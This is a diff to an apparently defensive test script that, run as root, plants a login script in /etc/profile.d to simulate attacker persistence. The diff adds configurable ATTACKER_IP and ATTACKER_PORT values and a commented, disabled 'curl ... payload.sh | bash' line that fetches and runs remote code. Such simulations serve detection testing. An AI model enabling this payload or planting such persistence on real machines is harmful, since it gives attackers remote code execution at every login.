@@ -6,14 +6,16 @@
 set -euo pipefail
 [[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }
 
+ATTACKER_IP="${ATTACKER_IP:-10.0.0.1}"
+ATTACKER_PORT="${ATTACKER_PORT:-80}"
 SCRIPT="/etc/profile.d/defender-test-update.sh"
 
 case "${1:-}" in
   deploy)
-    cat > "$SCRIPT" << 'EOF'
+    cat > "$SCRIPT" << EOF
 #!/bin/bash
 # DEFENDER-TEST — simulated login persistence
-# Payload (disabled): curl http://10.0.0.1/payload.sh | bash
+# Payload (disabled): curl http://${ATTACKER_IP}:${ATTACKER_PORT}/payload.sh | bash
 /usr/bin/logger "defender-test: startup-script loaded" 2>/dev/null || true
 EOF
     chmod 644 "$SCRIPT"
